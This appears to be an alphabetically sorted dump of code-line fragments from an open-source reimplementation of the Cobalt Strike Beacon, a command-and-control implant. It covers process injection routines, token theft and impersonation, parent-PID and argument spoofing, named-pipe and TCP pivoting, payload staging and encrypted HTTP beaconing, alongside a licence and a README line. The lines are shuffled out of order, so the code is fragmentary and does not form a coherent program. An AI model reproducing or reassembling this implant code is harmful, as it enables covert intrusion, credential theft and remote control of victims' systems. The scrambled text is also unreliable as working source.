+"FilesystemRemoveRecursiveCallback(filename, lpCurrentFindFileData->cFileName, FALSE)"
+"FilesystemRemoveRecursiveCallback(filename, lpFileNameInternal, TRUE)"
+"FreeLibrary,"
+"GetComputerNameA(computerName, "
+"GetCurrentDirectoryA(MAX_FILENAME, filename)"
+"GetCurrentDirectoryW(0x400, lpCurrentDirectory)"
+"GetCurrentDirectoryW(sizeof(cmd) / sizeof(WCHAR), buffer)"
+"GetModuleHandleA,"
+"GetProcAddress,"
+"GetUserNameA(userName, "
+"HANDLE CreateThreadEx(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)"
+"HANDLE CreateThreadWithCfgCaution(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter) {"
+"HANDLE firstFile = FindFirstFileA(filename, "
+"HANDLE hFileMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL)"
+"HANDLE hFindFile = FindFirstFileA(lpFileName, lpCurrentFindFileData)"
+"HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid)"
+"HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid)"
+"HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid)"
+"HANDLE hRead, hWrite"
+"HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)"
+"HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitProcess, NULL, 0, NULL)"
+"HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID)"
+"HANDLE toolhelp = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)"
+"HMODULE hModule = GetModuleHandleA(""kernel32"")"
+"HMODULE hModule = GetModuleHandleA(""ntdll"")"
+"HMODULE hModule = GetModuleHandleA(""ntdll.dll"")"
+"HeapFree(GetProcessHeap(), 0, lpAttributeList)"
+"HttpAddRequestHeadersA(hInternet, S_HEADERS_REMOVE, INFINITE, HTTP_ADDREQ_FLAG_REPLACE)"
+"HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength)"
+"HttpSendRequestA(hRequest, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength)"
+"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
+"INTERNET_SERVICE_HTTP,"
+"IdentityElevatePre(buffer, size)"
+"IdentityGetPrivileges(buffer, size)"
+"IdentityGetPrivilegesInternal(buffer, length, gIdentityToken, "
+"IdentityGetPrivilegesInternal(buffer, length, hToken, "
+"IdentityLoginUser(buffer, size)"
+"IdentityLoginUserInternal(domain, username, password)"
+"IdentityStealToken(buffer, size)"
+"InitializeProcThreadAttributeList(NULL, dwAttributeCount, 0, "
+"InjectIntoPid(payload, size, x86)"
+"InjectIntoPidAndPing(buffer, size, FALSE)"
+"InjectIntoPidAndPing(buffer, size, TRUE)"
+"InjectLocally(CFGCautionThreadStub, (unsigned int)CFGCautionThreadStubEnd - (unsigned int)CFGCautionThreadStub)"
+"InlineExecuteObject(buffer, size)"
+"InternetQueryOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, "
+"InternetSetOptionA(gInternetConnect, INTERNET_OPTION_PROXY_PASSWORD, S_PROXY_PASSWORD, STRLEN(S_PROXY_PASSWORD))"
+"InternetSetOptionA(gInternetConnect, INTERNET_OPTION_PROXY_USERNAME, S_PROXY_USER, STRLEN(S_PROXY_USER))"
+"InternetSetOptionA(gInternetOpen, INTERNET_OPTION_RECEIVE_TIMEOUT, "
+"InternetSetOptionA(gInternetOpen, INTERNET_OPTION_SEND_TIMEOUT, "
+"InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, "
+"InternetSetStatusCallback(hInternet, NetworkStatusCallback)"
+"JobExecute(buffer, size)"
+"JobExecuteInternal(cmd, strlen(cmd) "
+"JobKill(buffer, size)"
+"JobRegister(buffer, size, FALSE, FALSE)"
+"JobRegister(buffer, size, FALSE, TRUE)"
+"JobRegister(buffer, size, TRUE, FALSE)"
+"JobRegisterPipe(hPipe, pid32, callbackType, description, isMsgMode)"
+"JobSpawn(buffer, size, FALSE, FALSE)"
+"JobSpawn(buffer, size, FALSE, TRUE)"
+"JobSpawn(buffer, size, TRUE, FALSE)"
+"JobSpawn(buffer, size, TRUE, TRUE)"
+"JobSpawnInternal(callbackType, waitTime, reflectiveLoaderOffset, payload, payloadLength, argument, argumentLength, description, descriptionLength, x86, ignoreToken)"
+"LERROR(""%d is a x64 process (can't inject x86 content)"", pid)"
+"LERROR(""%d is a x86 process (can't inject x64 content)"", pid)"
+"LERROR(""Allocate section and copy data failed: %s"", LAST_ERROR_STR(lastError))"
+"LERROR(""Cannot find RtlCreateUserThread in ntdll.dll"")"
+"LERROR(""Copy failed: %s"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not adjust arguments in process: %s - Reason: Could not adjust permissions"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not adjust arguments in process: %s - Reason: Could not get thread context"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not adjust arguments in process: %s - Reason: Could not read command line"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not adjust arguments in process: %s - Reason: Could not read process parameters"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not adjust arguments in process: %s - Reason: Could not write new command line"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not adjust permissions in process: %s"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not allocate %d bytes in process: %s"", dwSize, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not allocate memory for route aux"")"
+"LERROR(""Could not bind to %d"", port)"
+"LERROR(""Could not connect to pipe (%s): %s"", text, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not connect to pipe: %s"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not connect to target (stager)"")"
+"LERROR(""Could not create remote thread in %d: %s"", injection->pid, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not create token: %s"", LAST_ERROR_STR(error))"
+"LERROR(""Could not determine full path of '%s'"""
+"LERROR(""Could not kill %d: %s"", pid, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not open %s: %s"", filename, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not open '%s'"", lpFileName)"
+"LERROR(""Could not open process %d: %s"", pid, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not open process token"")"
+"LERROR(""Could not open process token: %d (%s)"", pid, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not run %s as %s"
+"LERROR(""Could not run command(w / token) because of its length of %d"", runUnderConfig->cmdLength)"
+"LERROR(""Could not set PID to %d: %s"", parentPid, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not spawn %s (token"
+"LERROR(""Could not spawn %s (token) with extended startup information. Reset ppid, disable blockdlls, or rev2self to drop your token."", runUnderConfig->cmd)"
+"LERROR(""Could not spawn %s (token): %s"", execution->cmd, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not spawn %s (token): %s"", runUnderConfig->cmd, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not spawn %s: %s"", execution->cmd, LAST_ERROR_STR(lastError))"
+"LERROR(""Could not update process attribute: %s"", LAST_ERROR_STR(lastError))"
+"LERROR(""Could not upload file: %s"", LAST_ERROR_STR(error))"
+"LERROR(""Could not write to process memory: %s"", LAST_ERROR_STR(lastError))"
+"LERROR(""Failed to duplicate token from %d (%s)"", pid, LAST_ERROR_STR(lastError))"
+"LERROR(""Failed to impersonate logged on user %d (%s)"", pid, LAST_ERROR_STR(lastError))"
+"LERROR(""Failed to impersonate token from %d (%s)"", pid, LAST_ERROR_STR(lastError))"
+"LERROR(""Failed to impersonate token: %s"", LAST_ERROR_STR(error))"
+"LERROR(""Failed to impersonate token: %s"", LAST_ERROR_STR(lastError))"
+"LERROR(""Failed to open token"")"
+"LERROR(""Failed to parse domain"")"
+"LERROR(""Failed to parse password"")"
+"LERROR(""Failed to parse username"")"
+"LERROR(""File '%s' is either too large (>4GB) or size check failed"")"
+"LERROR(""Invalid proxy behavior: %d"", S_PROXY_BEHAVIOR)"
+"LERROR(""Maximum links reached. Disconnect one"")"
+"LERROR(""Move failed: %s"", LAST_ERROR_STR(lastError))"
+"LERROR(""PPID %d is in a different desktop session (spawned jobs may fail). Use 'ppid' to reset."", gParentPid)"
+"LERROR(""Prepend parameter %d is greater than recoverable length %d"", param, recoverableLength)"
+"LERROR(""Real arguments are longer than fake arguments."")"
+"LERROR(""Unknown command: %d"", cmd)"
+"LERROR(""Unknown data argument %d"", dataArgument)"
+"LERROR(""Unknown step %d"", step)"
+"LERROR(""gSpawnToX64 is not NULL or empty"")"
+"LERROR(""gSpawnToX86 is not NULL or empty"")"
+"LERROR(""kernel32$IsWow64Process: IsWow64Process is NULL"")"
+"LERROR(""x64 Beacon cannot adjust arguments in x86 process"")"
+"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
+"LOGON_NETCREDENTIALS_ONLY,"
+"LOGON_WITH_PROFILE,"
+"LPBYTE lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT "
+"LPVOID attributeList = HeapAlloc(processHeap, 0, size)"
+"LPVOID lpFileMap = MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, dwSize)"
+"LWARNING(""Could not do PipeConnect. Retrying with Revert/Impersonate"")"
+"LWARNING(""Could not spawn %s (token): %s"", execution->cmd, LAST_ERROR_STR(lastError))"
+"LinkViaTcp(buffer, size)"
+"LoadLibraryA,"
+"MAX_HEADER_SIZE,"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.Cpp.$(Platform).user.props"" Condition=""exists('$(UserRootDir)"
+"Microsoft.Cpp.$(Platform).user.props')"" Label=""LocalAppDataPlatform"" />"
+"Microsoft.Cpp.Default.props"" />"
+"Microsoft.Cpp.props"" />"
+"Microsoft.Cpp.targets"" />"
+"NTSTATUS status = _NtMapViewOfSection(hFileMapping, handle, "
+"NULL, "
+"NULL,"
+"PROCESS_INFORMATION lPi = { pi.hProcess, NULL, pi.dwProcessId, 0 }"
+"PRUN_UNDER_CONTEXT UpdateChildProcessContext(PRUN_UNDER_CONTEXT context, DWORD parentPid, LPPROC_THREAD_ATTRIBUTE_LIST attributeList, STARTUPINFO"
+"Pause(buffer, size)"
+"Permission is hereby granted, free of charge, to any person obtaining a copy"
+"PipeClose(buffer, size)"
+"PipeReopen(buffer, size)"
+"PipeRoute(buffer, size)"
+"PipeWaitForData(hPipe, waitTime, 500)"
+"PipeWaitForData(hRead, waitTime, 500)"
+"PowershellHostTcp(buffer, size)"
+"PowershellImport(buffer, size)"
+"ProcessKill(buffer, size)"
+"ProcessList(buffer, size)"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""Beacon"", ""Beacon"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""libtomcrypt"", ""libtomcrypt"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""tommath"", ""libtommath"
+"RUN_UNDER_CONFIG runUnderConfig = { cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken }"
+"ReadFile(hPipe, buffer, size - totalRead, "
+"RunAsUser(buffer, size)"
+"RunAsUserInternal(domain, username, password, cmd, 0, "
+"RunSetParentPid(buffer, size)"
+"RunUnder(cmd, strlen(cmd), "
+"RunUnderParent(cmd, length, "
+"RunUnderPid(buffer, size)"
+"SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE }"
+"SOCKET ChannelSocketCreateAndBind(const int addr, const short port, const int backlog)"
+"SOCKET acceptSocket = accept(webResponse->socket, NULL, NULL)"
+"SOCKET sock = ChannelSocketCreateAndBind(INADDR_ANY, port, 1)"
+"SOCKET sock = ChannelSocketCreateAndBind(INADDR_ANY, port, 10)"
+"SOCKET sock = ChannelSocketCreateAndBind(ipAddress, port, 10)"
+"SOCKET sock = LinkViaTcpConnect(target, port)"
+"SOCKET sock = WSASocketA(AF_INET, SOCK_DGRAM, 0, NULL, 0, 0)"
+"SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS)"
+"SOCKET socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS)"
+"SYSTEMTIME systemTime, localTime"
+"S_C2_VERB_POST,"
+"SleepSet(buffer, size)"
+"Spawn(buffer, size, FALSE, FALSE)"
+"Spawn(buffer, size, FALSE, TRUE)"
+"Spawn(buffer, size, TRUE, FALSE)"
+"Spawn(spawnData, spawnSize, x86, TRUE)"
+"SpawnAndPing(buffer, size, FALSE)"
+"SpawnAndPing(buffer, size, TRUE)"
+"SpawnAsUser(buffer, size, FALSE)"
+"SpawnAsUser(buffer, size, TRUE)"
+"SpawnSetTo(buffer, size, FALSE)"
+"SpawnSetTo(buffer, size, TRUE)"
+"SpawnToExpand(cmd, MAX_CMD, x86)"
+"SpawnToFix(x86, cmd)"
+"SpawnUnder(buffer, size, FALSE)"
+"SpawnUnder(buffer, size, TRUE)"
+"StagePayloadViaPipe(buffer, size)"
+"StagePayloadViaTcp(buffer, size)"
+"SystemTimeToTzSpecificLocalTime(NULL, "
+"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
+"TRUE,"
+"TaskDispatch(cmd, data, size)"
+"TerminateProcess(execution->processInfo->hProcess, 0)"
+"Upload(buffer, size, ""ab"")"
+"Upload(buffer, size, ""wb"")"
+"ViewShare = 1,"
+"VirtualFree(entry->record.ptr, 0, MEM_RELEASE)"
+"VirtualFree(lpBaseAddress, 0, MEM_RELEASE)"
+"VirtualFree(pAlloc, 0, MEM_RELEASE)"
+"WOW64DISABLEWOW64FSREDIRECTION fnWow64DisableWow64FsRedirection = (WOW64DISABLEWOW64FSREDIRECTION)GetProcAddress(hModule, ""Wow64DisableWow64FsRedirection"")"
+"WOW64REVERTWOW64FSREDIRECTION fnWow64RevertWow64FsRedirection = (WOW64REVERTWOW64FSREDIRECTION)GetProcAddress(hModule, ""Wow64RevertWow64FsRedirection"")"
+"WaitForSingleObject(hPreelevationAuxThread, 15000)"
+"WaitForSingleObject(hThread, INFINITE)"
+"WaitForSingleObject(pi.hProcess, 10000)"
+"WaitNamedPipeA(data, 10000)"
+"We welcome contributions from the community. If you have improvements, bug fixes, or new features to add, please submit a pull request. Be sure to follow the existing coding style and provide clear commit messages."
+"WebServerInit(port, content, contentLength)"
+"WebServerInit(port, gImportedPshScript, strlen(gImportedPshScript))"
+"WebServerLocal(buffer, size)"
+"Welcome to the open-source implementation of the Cobalt Strike Beacon! This project aims to provide a fully functional, from-scratch alternative to the Cobalt Strike Beacon, offering transparency and flexibility for security professionals and enthusiasts."
+"Win32"">"
+"Win32'"" Label=""Configuration"">"
+"Win32'"">"
+"Win32'"">Create</PrecompiledHeader>"
+"WriteFile(hFile, "
+"WriteProcessMemory(injection->process, lpApcContext, "
+"_RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpStartAddress, lpParameter, "
+"_snprintf(lpPathName, 0x4000, ""%s"
+"acceptTypes,"
+"accessType,"
+"accountName,"
+"acp, 2)"
+"addr, sizeof(addr)) == SOCKET_ERROR)"
+"addr.sin_addr, host->h_addr, host->h_length)"
+"arch = ""x64"""
+"arch = ""x86"""
+"argument = (ARGUMENT_ENTRY){ .isActive = FALSE, .expandedCmd = NULL, .expandedFullCmd = NULL, .next = current }"
+"available, NULL))"
+"base64_encode(transform->transformed, transformedLength, transform->temp, "
+"base64url_encode(transform->transformed, transformedLength, transform->temp, "
+"bid, sizeof(int))"
+"bid, sizeof(u_long))"
+"buffer, "
+"buffer, sizeof(buffer))"
+"bufferSize = min(bufferSize, 1024 - 1)"
+"bytesAvailable, 0, 0) "
+"bytesReturned, NULL, NULL))"
+"channelId, sizeof(channelId))"
+"childContext, parentPid, lpAttributeList, runUnderConfig->startupInfo))"
+"cmd,"
+"cmds, execution->cmd) == FALSE)"
+"commandLine, sizeof(commandLine), NULL))"
+"const BOOL couldAdjust = ProcessCmdAdjust(execution->processInfo, "
+"const bool isConnectionStrategyFailed, STRATEGY strategy) {"
+"const bool isConnectionStrategyFailed, STRATEGY strategy)"
+"const int session_len,"
+"context->processAttribute, sizeof(context->processAttribute), NULL, NULL))"
+"copies of the Software, and to permit persons to whom the Software is"
+"creds): %s"", execution->cmd, LAST_ERROR_STR(lastError))"
+"current = (ARGUMENT_ENTRY){ .isActive = FALSE, .expandedCmd = NULL, .expandedFullCmd = NULL, .next = current->next }"
+"currentDirectory,"
+"data, sizeof(APC_ROUTINE_CONTEXT), "
+"dataLength, sizeof(dataLength), "
+"define ANSI_COLOR_BLUE    """
+"define ANSI_COLOR_GREEN   """
+"define ANSI_COLOR_MAGENTA """
+"define ANSI_COLOR_RED     """
+"define ANSI_COLOR_RESET   """
+"define ANSI_COLOR_YELLOW  """
+"define INIT_VECTOR ""abcdefghijklmnop"""
+"define LAST_ERROR_STR(...) """" // TODO: Implement"
+"define LERROR(...) LOG(ANSI_COLOR_RED, ""[ERROR]"", __VA_ARGS__)"
+"define LINFO(...) LOG(ANSI_COLOR_BLUE, ""[INFO]"", __VA_ARGS__)"
+"define LLOG(...) LOG("""
+"define LNEWLINE() LOG("""
+"define LOG(color, label, format, ...) "
+"define LOK(...) LOG(ANSI_COLOR_GREEN, ""[OK]"", __VA_ARGS__)"
+"define LTODO(...) LOG(ANSI_COLOR_MAGENTA, ""[TODO]"", __VA_ARGS__)"
+"define LWARNING(...) LOG(ANSI_COLOR_YELLOW, ""[WARNING]"", __VA_ARGS__)"
+"define SOURCE_DIRECTORY """
+"domainLength, NULL))"
+"dwViewSize, ViewShare, 0, S_PROCINJ_PERMS)"
+"else if (FD_ISSET(sock, "
+"error ""Invalid domain strategy"""
+"exceptfds, "
+"execution->cmd,"
+"execution->creationFlags,"
+"execution->startupInfo,"
+"extendedCmd = (EXPANDED_CMD) { current->expandedFullCmd, current->expandedCmd }"
+"file = CreateFileA(data, GENERIC_READ "
+"filepath,"
+"finalUri, "
+"finalUri,"
+"findData.ftLastWriteTime, "
+"fnBeaconErrorD)(int type, int d1)"
+"fnBeaconErrorDD)(int type, int d1, int d2)"
+"fnBeaconGetSpawnTo)(BOOL x86, char"
+"fnBeaconInjectProcess)(HANDLE hProcess, int pid, char"
+"fnBeaconOutput)(int type, char"
+"fnBeaconPrintf)(int type, char"
+"fnBeaconSpawnTemporaryProcess)(BOOL x86, BOOL ignoreToken, STARTUPINFO"
+"fnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName)"
+"for (i = 0, j = 0"
+"format = (formatp){ buffer, buffer, 0, size }"
+"format = (formatp){ format->original, format->original, 0, format->size }"
+"format, "
+"format, ""%d"
+"format, ""%s"
+"format, 0)"
+"format, 0x8000)"
+"format, GetModuleHandleA)"
+"format, GetProcAddress)"
+"format, IS_X64() "
+"format, MAX_FILENAME "
+"format, METADATA_ID)"
+"format, activeAdapterIPv4)"
+"format, append, appendSize)"
+"format, bid)"
+"format, buf, read - sizeof(int))"
+"format, currentPid)"
+"format, download->fid)"
+"format, fileSize)"
+"format, flags)"
+"format, gBid)"
+"format, info, min(strlen(info), 58))"
+"format, lpBuffer, fullPathSize)"
+"format, openLink->callbackData, MAX_CALLBACK_DATA)"
+"format, osVersionInfo->dwBuildNumber)"
+"format, osVersionInfo->dwMajorVersion)"
+"format, osVersionInfo->dwMinorVersion)"
+"format, out, sizeof(out))"
+"format, payload, pLen)"
+"format, pivotHints)"
+"format, prepend, prependSize)"
+"format, prependSize "
+"format, size)"
+"fseek(file, 0, SEEK_END)"
+"fseek(file, 0, SEEK_SET)"
+"furnished to do so, subject to the following conditions:"
+"fwrite(data, sizeof(char), remaining, file)"
+"gDownloadChunk, totalRead "
+"gIdentityDomain = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_DOMAIN "
+"gIdentityDomain, 0, IDENTITY_MAX_WCHARS_DOMAIN)"
+"gIdentityDomain,"
+"gIdentityPassword = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_PASSWORD "
+"gIdentityPassword,"
+"gIdentityToken,"
+"gIdentityUsername = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_USERNAME "
+"gIdentityUsername,"
+"gInternetConnect, "
+"gInternetConnect,"
+"gInternetOpen,"
+"gNetworkOptions, "
+"gNetworkOptions,"
+"gRecords = realloc(gRecords, sizeof(RECORD_ENTRY) "
+"gRecords[gRecordCapacity], 0, sizeof(RECORD_ENTRY) "
+"gSelectedRandomDomainIndex = RoundToNearestEven(RandomIntInRange(0, gRandomTokenCount - 1))"
+"gSpawnToX64 = BeaconDataPtr(parser, MAX_SPAWN_TO_X64)"
+"gSpawnToX86 = BeaconDataPtr(parser, MAX_SPAWN_TO_X86)"
+"hFile, 0))"
+"hPipe, impersonate "
+"hPreelevationAuxThread = CreateThreadEx(IdentityElevationThread, NULL)"
+"hPrenamedPipe = CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 2, 0, 0, 0, NULL)"
+"hProcess, sizeof(HANDLE), NULL, NULL))"
+"hRead, "
+"hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)finalAddress, lpParameter, CREATE_SUSPENDED, NULL)"
+"hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)finalAddress, lpParameter, CREATE_SUSPENDED, NULL)"
+"hThread, "
+"hWrite, "
+"headerSize, sizeof(headerSize)) != sizeof(headerSize) "
+"id, sizeof(int))"
+"if (!CheckTokenMembership(NULL, sid, "
+"if (!CopyFileA(existingFileName, newFileName, FALSE))"
+"if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, "
+"if (!ExecuteInjection(injection, target, pOffset, parameter))"
+"if (!GetAccountNameFromToken(hProcess, accountName, sizeof(accountName))) {"
+"if (!GetThreadContext(hThread, "
+"if (!GetThreadContext(processInfo->hThread, "
+"if (!GetTokenInformation(hToken, TokenUser, tokenInfo, sizeof(tokenInfo), "
+"if (!HttpQueryInfoA(hInternet, HTTP_QUERY_STATUS_CODE, status, "
+"if (!IdentityGetUserInfo(gIdentityToken, buffer, MAX_BUFFER))"
+"if (!InitializeProcThreadAttributeList(attributeList, dwAttributeCount, 0, "
+"if (!InternetReadFile(hInternet, data "
+"if (!LookupAccountSidA(NULL, ((TOKEN_USER"
+"if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, "
+"if (!PeekNamedPipe(hNamedPipe, NULL, 0, NULL, "
+"if (!PeekNamedPipe(hPipe, NULL, 0, NULL, "
+"if (!ProcessIdToSessionId(GetCurrentProcessId(), "
+"if (!ProcessIdToSessionId(pe.th32ProcessID, "
+"if (!ProcessIdToSessionId(pid, "
+"if (!ProtocolSmbPipeWrite(protocol->channel.handle, header, headerSize))"
+"if (!ProtocolTcpSocketWrite(protocol->channel.socket, header, headerSize))"
+"if (!ReadFile(channel, buffer "
+"if (!ReadProcessMemory(injection->process, lpApcContext, "
+"if (!SetNamedPipeHandleState(file, "
+"if (!SetThreadContext(hThread, "
+"if (!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, "
+"if (!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, "
+"if (!VirtualProtect(payload, size, S_PROCINJ_PERMS, "
+"if (!VirtualProtectEx(hProcess, lpBaseAddress, dwSize, S_PROCINJ_PERMS, "
+"if (!VirtualProtectEx(processInfo->hProcess, commandLine.Buffer, commandLine.MaximumLength, PAGE_READWRITE, "
+"if (!WSAIoctl(sock, SIO_GET_INTERFACE_LIST, NULL, 0, interfaceInfo, sizeof(interfaceInfo), "
+"if (!WaitNamedPipeA(lpFileName, 10000))"
+"if (!Wow64GetThreadContext(hThread, "
+"if (!Wow64SetThreadContext(hThread, "
+"if (!WriteFile(hFile, data "
+"if (!WriteProcessMemory(hProcess, lpBaseAddress "
+"if (!protocol->waitForData(protocol, 30000, 10))"
+"if (!toWideChar(cmds->cmd, newCmd, commandLine.MaximumLength / sizeof(WCHAR)))"
+"if (AdjustMemoryPermissions(pAlloc, dwSize))"
+"if (AdjustTokenPrivileges(hToken, FALSE, "
+"if (BeaconSpawnTemporaryProcess(x86, ignoreToken, "
+"if (ExecuteViaCreateRemoteThread(injection->process, lpStartAddress "
+"if (ExecuteViaCreateRemoteThread_s(METHOD_CREATE_REMOTE_THREAD_S, injection->process, lpStartAddress "
+"if (ExecuteViaCreateRemoteThread_s(METHOD_CREATE_THREAD_S, injection->process, lpStartAddress "
+"if (ExecuteViaCreateThread(injection, lpStartAddress "
+"if (ExecuteViaNtQueueApcThread(injection, lpStartAddress "
+"if (ExecuteViaNtQueueApcThread_s(injection, lpStartAddress "
+"if (ExecuteViaRtlCreateUserThread(injection->process, lpStartAddress "
+"if (ExecuteViaSetThreadContext(injection, lpStartAddress "
+"if (FD_ISSET((SOCKET)channel->socket, "
+"if (FD_ISSET(sock, "
+"if (GetCurrentDirectoryW(0, 0) < 0x400)"
+"if (GetCurrentDirectoryW(0, 0) < sizeof(cmd) / sizeof(WCHAR))"
+"if (GetModuleFileNameA(NULL, fileName, MAX_FILE_NAME))"
+"if (IdentityGetUserInfo(gIdentityToken, (char"
+"if (IdentityGetUserInfo(gIdentityToken, accountName, sizeof(accountName)))"
+"if (IdentityGetUserInfo(hElevationToken, accountName, sizeof(accountName)))"
+"if (IdentityGetUserInfo(hToken, userInfo, sizeof(userInfo)))"
+"if (LookupPrivilegeValueA(NULL, name, "
+"if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, "
+"if (OpenThreadToken(hCurrentThread, TOKEN_ALL_ACCESS, FALSE, "
+"if (PipeConnect(filename, pipe, 0))"
+"if (Process32First(toolhelp, "
+"if (ProtocolSmbPipeRead(hPipe, (char"
+"if (SpawnAsUserInternal(x86, domain, username, password, "
+"if (SpawnUnderInternal(x86, TRUE, "
+"if (WSAStartup(MAKEWORD(2, 2), "
+"if (_NtQueueApcThread(injection->thread, lpStartAddress, lpParameter, NULL, NULL) != 0)"
+"if (cbc_encrypt(buffer, buffer, length, "
+"if (connect(sock, (struct sockaddr"
+"if (hash_memory(gHashSha256, (unsigned char"
+"if (hmac_memory(gHashSha256, gHmacKey, sizeof(gHmacKey), buffer, length, buffer "
+"if (ioctlsocket(protocol->channel.socket, FIONREAD, "
+"if (ioctlsocket(sock, FIONBIO, "
+"if (rsa_encrypt_key_ex(in, inlen, out, outlen, ""Zz"", STRLEN(""Zz""), 0, prng_idx, 0, LTC_PKCS_1_V1_5, "
+"if (strcmp(lpCurrentFindFileData->cFileName, ""."") "
+"if (toWideChar(runUnderConfig->cmd, cmd, sizeof(cmd)/sizeof(WCHAR)))"
+"if(!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, "
+"if(!LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, "
+"if(!MoveFileA(src, dst))"
+"if(!PeekNamedPipe(hPipe, NULL, 0, NULL, "
+"if(!ReadProcessMemory(processInfo->hProcess, "
+"if(!WriteProcessMemory(processInfo->hProcess, commandLine.Buffer, newCmd, commandLine.MaximumLength, "
+"if(!strncmp(filename, ""."" SOURCE_DIRECTORY, MAX_FILENAME))"
+"if(OpenProcessToken(hProcess, TOKEN_QUERY "
+"if(ReadFile(hPrenamedPipe, toRead, sizeof(char), "
+"if(RunUnderParent(buffer, length, "
+"if(cbc_start(gAesCipher, gIv, gCbcKey, sizeof(gCbcKey), 0, "
+"if(ioctlsocket(sock, FIONBIO, "
+"if(pProtocol->waitForData(pProtocol, 300000, 10))"
+"if(pProtocol->write(pProtocol, wdata, len) == 0)"
+"if(rijndael_setup(gCbcKey, sizeof(gCbcKey), 0, "
+"in the Software without restriction, including without limitation the rights"
+"include ""api.h"""
+"include ""argument.h"""
+"include ""beacon.h"""
+"include ""callback.h"""
+"include ""channel.h"""
+"include ""command.h"""
+"include ""crypto.h"""
+"include ""download.h"""
+"include ""error.h"""
+"include ""filesystem.h"""
+"include ""identity.h"""
+"include ""inline_execute_object.h"""
+"include ""job.h"""
+"include ""link.h"""
+"include ""logger.h"""
+"include ""macros.h"""
+"include ""metadata.h"""
+"include ""network.h"""
+"include ""pch.h"""
+"include ""pipe.h"""
+"include ""powershell.h"""
+"include ""process.h"""
+"include ""protocol.h"""
+"include ""self.h"""
+"include ""settings.h"""
+"include ""spawn.h"""
+"include ""stage.h"""
+"include ""strategy.h"""
+"include ""strategy_default.c"""
+"include ""strategy_failover.c"""
+"include ""strategy_random.c"""
+"include ""thread.h"""
+"include ""tomcrypt.h"""
+"include ""transform.h"""
+"include ""utils.h"""
+"include ""web_response.h"""
+"injection, payload, pLen, pOffset, parameter)"
+"injection, str, aLen)"
+"int ChannelReceiveDataInternal(SOCKET socket, char"
+"int FromNetbios(char nb, const char"
+"int FromNetbios(const char nb, const char"
+"int JobReadDataFromPipe(HANDLE hPipe, char"
+"int JobReadDataFromPipeWithHeader(HANDLE hPipe, char"
+"int PipeConnectWithToken(LPCSTR filename, HANDLE"
+"int PipeConnectWithTokenNoFlags(LPCSTR filename, HANDLE"
+"int ProtocolSmbPipeRead(HANDLE channel, char"
+"int ProtocolTcpSocketRead(SOCKET channel, char"
